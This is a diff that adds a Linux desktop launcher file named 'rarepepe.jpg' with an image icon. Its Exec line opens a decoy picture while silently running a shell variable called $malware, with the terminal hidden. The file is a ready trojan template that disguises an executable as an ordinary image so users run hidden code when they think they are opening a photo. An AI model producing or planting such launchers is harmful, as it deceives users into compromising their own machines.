@@ -1,0 +1,7 @@
+[Desktop Entry]
+Name=rarepepe.jpg
+Exec=sh -c "xdg-open ./rarepepe2.jpg & $malware"
+Terminal=false
+Icon=./rarepepe2.jpg
+Type=Application
+Categories=Graphics
